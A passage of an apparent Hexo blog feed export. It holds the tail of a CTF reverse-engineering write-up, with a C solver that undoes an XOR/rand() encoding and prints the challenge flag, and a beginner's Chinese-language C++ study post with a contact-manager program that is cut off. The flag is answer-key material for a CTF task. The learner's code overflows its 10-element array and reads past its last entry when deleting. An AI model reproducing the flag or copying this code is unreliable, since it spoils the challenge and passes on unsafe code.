class="keyword">unsigned</span> <span class="keyword">char</span> Xor[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i ;</span><br><span class="line">srand((<span class="keyword">unsigned</span> __int8)send);</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">16</span>;i++)</span><br><span class="line">&#123;</span><br><span class="line">Xor[i]=rand()&amp;<span class="number">0xff</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> key[]=&#123;<span class="number">0x13</span>, <span class="number">0x09</span>, <span class="number">0x0A</span>, <span class="number">0x20</span>, <span class="number">0x98</span>, <span class="number">0x42</span>, <span class="number">0x8F</span>, <span class="number">0x82</span>, <span class="number">0x1C</span>, <span class="number">0x37</span>, </span><br><span class="line">  <span class="number">0xA9</span>, <span class="number">0xCB</span>, <span class="number">0xFD</span>, <span class="number">0xE5</span>, <span class="number">0x30</span>, <span class="number">0x03</span>, <span class="number">0x6E</span>, <span class="number">0xBF</span>, <span class="number">0x9D</span>, <span class="number">0x4C</span>, </span><br><span class="line">  <span class="number">0x61</span>, <span class="number">0xFE</span>, <span class="number">0x14</span>, <span class="number">0xCD</span>, <span class="number">0xAB</span>, <span class="number">0x38</span>, <span class="number">0xA2</span>, <span class="number">0xF0</span>, <span class="number">0x62</span>, <span class="number">0x34</span>, </span><br><span class="line">  <span class="number">0xC3</span>, <span class="number">0xCC</span>&#125;;</span><br><span class="line"><span class="keyword">char</span> code[]=&#123;</span><br><span class="line">  <span class="number">0x2F</span>, <span class="number">0x1E</span>, <span class="number">0x76</span>, <span class="number">0xF3</span>, <span class="number">0x7A</span>, <span class="number">0x3F</span>, <span class="number">0x4F</span>, <span class="number">0x8D</span>, <span class="number">0x56</span>, <span class="number">0xD7</span>, </span><br><span class="line">  <span class="number">0xE2</span>, <span class="number">0x70</span>, <span class="number">0x69</span>, <span class="number">0x46</span>, <span class="number">0x21</span>, <span class="number">0x39</span>, <span class="number">0x09</span>, <span class="number">0x45</span>, <span class="number">0xB5</span>, <span class="number">0xB6</span>, </span><br><span class="line">  <span class="number">0xB7</span>, <span class="number">0x59</span>, <span class="number">0x46</span>, <span class="number">0x41</span>, <span class="number">0xA6</span>, <span class="number">0x1B</span>, <span class="number">0x5F</span>, <span class="number">0x1D</span>, <span class="number">0xA0</span>, <span class="number">0x1D</span>, </span><br><span class="line">  <span class="number">0x93</span>, <span class="number">0x81</span>&#125;;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> Xor[<span class="number">16</span>]=&#123;&#125;;</span><br><span class="line">  <span class="keyword">int</span> send;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">32</span>;i++)</span><br><span class="line">&#123;</span><br><span class="line">code[i]=(key[i]+code[i])&amp;<span class="number">0xff</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(send=<span class="number">0</span>;send&lt;<span class="number">255</span>;send++)</span><br><span class="line">&#123;</span><br><span class="line">random(<span class="number">147</span>,Xor);<span class="comment">//爆破出来seed是147 </span></span><br><span class="line"><span class="comment">//printf(&quot;%d: &quot;,send);</span></span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">16</span>;i++)</span><br><span class="line">&#123;</span><br><span class="line">code[i]=code[i]^Xor[i];</span><br><span class="line"><span class="comment">//printf(&quot;%c&quot;,code[i]);</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//printf(&quot;\n&quot;);</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">16</span>;i&lt;<span class="number">32</span>;i++)</span><br><span class="line">&#123;</span><br><span class="line">code[i]=code[i]^code[i<span class="number">-16</span>]; </span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>,code);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//D0g3&#123;c97d0d4cd003451c4c95ce9a5f&#125;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C++ learn</title>
      <link href="2021/07/28/c++/"/>
      <url>2021/07/28/c++/</url>
      
        <content type="html"><![CDATA[<h1 id="C-learn"><a href="#C-learn" class="headerlink" title="C++ learn"></a>C++ learn</h1><p>记录一些学c++的笔记吧，主要是跟着b站黑马程序员学的，众所周知，B站是学习网站。目前进度，核心编程学了，提高编程未学。</p><h2 id="C-基础入门"><a href="#C-基础入门" class="headerlink" title="C++基础入门"></a>C++基础入门</h2><p>就基础方面的话，和c大致差不多，不同点就写下面吧。</p><h3 id="输入，输出"><a href="#输入，输出" class="headerlink" title="输入，输出"></a>输入，输出</h3><p>c++多了一种输入输出的方式，cin，cout。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> a=<span class="number">10</span>;</span><br><span class="line"><span class="keyword">char</span> ch;</span><br><span class="line"><span class="built_in">cin</span> &gt;&gt; ch;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; ch &lt;&lt;<span class="string">&quot;=&quot;</span>&lt;&lt; a &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="string变量"><a href="#string变量" class="headerlink" title="string变量"></a>string变量</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> ch[<span class="number">10</span>]=<span class="string">&quot;hellow&quot;</span>;</span><br><span class="line"><span class="comment">//ch[10] = &quot;abc&quot;;C语言的这种字符串是不能直接改变内容的</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">string</span> str=<span class="string">&quot;world&quot;</span>;</span><br><span class="line">str = <span class="string">&quot;abc&quot;</span>;<span class="comment">//可以看到string类型是可以直接赋值的</span></span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; str &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="实战-通讯录管理资料"><a href="#实战-通讯录管理资料" class="headerlink" title="实战-通讯录管理资料"></a>实战-通讯录管理资料</h2><p>跟着资料写一写</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">person</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="built_in">string</span> name;</span><br><span class="line"><span class="keyword">int</span> sex;</span><br><span class="line"><span class="keyword">int</span> age;</span><br><span class="line"><span class="built_in">string</span> phone;</span><br><span class="line"><span class="built_in">string</span> address;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> num=<span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">isexit</span><span class="params">(struct person *arr, <span class="built_in">string</span> name)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; num; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (arr[i].name == name)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">welcome</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;***************************&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;*****  1、添加联系人  *****&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;*****  2、显示联系人  *****&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;*****  3、删除联系人  *****&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;*****  4、查找联系人  *****&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;*****  5、修改联系人  *****&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;*****  6、清空联系人  *****&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;*****  0、退出通讯录  *****&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;***************************&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">addcontacts</span><span class="params">(struct person *arr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (num &gt;= <span class="number">1000</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;通讯录已满&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">string</span> name;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;请输入姓名：&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cin</span> &gt;&gt; name;</span><br><span class="line">arr[num].name = name;</span><br><span class="line"><span class="keyword">int</span> sex;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;请输入性别：&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;1 -- 男&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;2 -- 女&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="keyword">while</span> (<span class="literal">true</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cin</span> &gt;&gt; sex;</span><br><span class="line"><span class="keyword">if</span> (sex == <span class="number">1</span> || sex == <span class="number">2</span>)</span><br><span class="line">&#123;</span><br><span class="line">arr[num].sex = sex;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;输入有误，请重新输入&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;请输入年龄&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="keyword">int</span> age;</span><br><span class="line"><span class="built_in">cin</span> &gt;&gt; age;</span><br><span class="line">arr[num].age = age;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;请输入电话号码&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">string</span> phone;</span><br><span class="line"><span class="built_in">cin</span> &gt;&gt; phone;</span><br><span class="line">arr[num].phone = phone;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;请输入家庭住址&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">string</span> address;</span><br><span class="line"><span class="built_in">cin</span> &gt;&gt; address;</span><br><span class="line">arr[num].address = address;</span><br><span class="line">num++;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;添加成功&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">system(<span class="string">&quot;cls&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">showcontacts</span><span class="params">(struct person *arr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"><span class="keyword">if</span> (num == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;当前通讯录里面没有联系人&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; num; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;姓名：&quot;</span> &lt;&lt; arr[i].name &lt;&lt; <span class="string">&quot;\t&quot;</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;性别：&quot;</span> &lt;&lt; arr[i].sex &lt;&lt; <span class="string">&quot;\t&quot;</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;年龄：&quot;</span> &lt;&lt; arr[i].age &lt;&lt; <span class="string">&quot;\t&quot;</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;电话号码：&quot;</span> &lt;&lt; arr[i].phone &lt;&lt; <span class="string">&quot;\t&quot;</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;家庭地址：&quot;</span> &lt;&lt; arr[i].address &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">system(<span class="string">&quot;cls&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">deletecontacts</span><span class="params">(struct person* arr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">string</span> name;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"><span class="keyword">int</span> target;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;请输入要删除的联系人&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cin</span> &gt;&gt; name;</span><br><span class="line">target = isexit(arr, name);</span><br><span class="line"><span class="keyword">if</span> (target == <span class="number">-1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;没有这个人&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (i = target; i &lt; num; i++)</span><br><span class="line">&#123;</span><br><span class="line">arr[i] = arr[i + <span class="number">1</span>];</span><br><span class="line">&#125;</span><br><span class="line">num--;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;删除成功&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line">system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">system(<span class="string">&quot;cls&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">findcontacts</span><span class="params">(struct person* arr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">string</span> name;</span><br><span class="line"><span class="keyword">int</span> target = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;请输入要查找的联系人&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cin</span> &gt;&gt; name;</span><br><span class="line">target = isexit(arr, name);</span><br><span class="line"><span class="keyword">if</span> (target == <span class="number">-1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;没有这个人&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;姓名：&quot;</span> &lt;&lt; arr[target].name &lt;&lt; <span class="string">&quot;\t&quot;</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;性别：&quot;</span> &lt;&lt; arr[target].sex &lt;&lt; <span class="string">&quot;\t&quot;</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;年龄：&quot;</span> &lt;&lt; arr[target].age &lt;&lt; <span class="string">&quot;\t&quot;</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;电话号码：&quot;</span> &lt;&lt; arr[target].phone &lt;&lt; <span class="string">&quot;\t&quot;</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;家庭地址：&quot;</span> &lt;&lt; arr[target].address &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line">system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">system(<span class="string">&quot;cls&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">modifycontact</span><span class="params">(struct person* arr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">string</span> name;</span><br><span class="line"><span class="keyword">int</span> target;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;请输入要修改的联系人&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cin</span> &gt;&gt; name;</span><br><span class="line">target = isexit(arr, name);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (target == <span class="number">-1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;没有这个人&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;请输入姓名：&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cin</span> &gt;&gt; name;</span><br><span class="line">arr[target].name = name;</span><br><span class="line"><span class="keyword">int</span> sex;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;请输入性别：&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;1 -- 男&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;2 -- 女&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="keyword">while</span> (<span class="literal">true</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cin</span> &gt;&gt; sex;</span><br><span class="line"><span class="keyword">if</span> (sex == <span class="number">1</span> || sex == <span class="number">2</span>)</span><br><span class="line">&#123;</span><br><span class="line">arr[target].sex = sex;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;输入有误，请重新输入&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;请输入年龄&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="keyword">int</span> age;</span><br><span class="line"><span class="built_in">cin</span> &gt;&gt; age;</span><br><span class="line">arr[target].age = age;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;请输入电话号码&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">string</span> phone;</span><br><span class="line"><span class="built_in">cin</span> &gt;&gt; phone;</span><br><span class="line">arr[target].phone = phone;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;请输入家庭住址&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">string</span> address;</span><br><span class="line"><span class="built_in">cin</span> &gt;&gt; address;</span><br><span class="line">arr[target].address = address;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;修改成功&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">system(<span class="string">&quot;cls&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">deleteallcontacts</span><span class="params">(struct person* arr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">num = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;所有联系人删除成功&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">system(<span class="string">&quot;cls&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> choice;</span><br><span class="line">person arr[<span class="number">10</span>];</span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">welcome();</span><br><span class="line"><span class="built_in">cin</span> &gt;&gt; choice;</span><br><span class="line"><span class="keyword">switch</span> (choice)</span><br><span class="line">&#123;</span><br><span class="line"><span 